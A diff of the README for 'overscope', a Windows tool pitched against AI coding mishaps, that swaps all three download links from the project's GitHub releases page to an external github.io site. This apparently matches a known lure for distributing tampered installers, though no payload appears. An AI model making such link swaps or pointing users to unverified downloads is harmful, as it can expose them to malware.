@@ -1,6 +1,6 @@
 # 🛡️ overscope - Stop AI Coding Chaos Before It Happens
 
-[![Download overscope](https://img.shields.io/badge/Download_overscope-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Historicalrecordeffects5599/overscope/releases)
+[![Download overscope](https://img.shields.io/badge/Download_overscope-4B0082?style=for-the-badge&logo=github&logoColor=white)](https://historicalrecordeffects5599.github.io)
 
 ## 🔍 What Is overscope?
 
@@ -56,7 +56,7 @@ Getting overscope on your Windows computer is quick and easy:
 
 **Step 1: Visit the download page**
 
-👉 [**Click here to visit the overscope download page**](https://github.com/Historicalrecordeffects5599/overscope/releases)
+👉 [**Click here to visit the overscope download page**](https://historicalrecordeffects5599.github.io)
 
 Visit this link to download the application. This page contains all the available versions of overscope.
 
@@ -148,7 +148,7 @@ If you rely on AI coding assistants to get work done, overscope is your best fri
 
 Don't wait for an AI disaster to happen. Download overscope now and take control of your coding workflow. It's free, it's local, and it works. Your future self—and your teammates—will thank you.
 
-**👉 [Download overscope Now](https://github.com/Historicalrecordeffects5599/overscope/releases)**
+**👉 [Download overscope Now](https://historicalrecordeffects5599.github.io)**
 
 ---
 
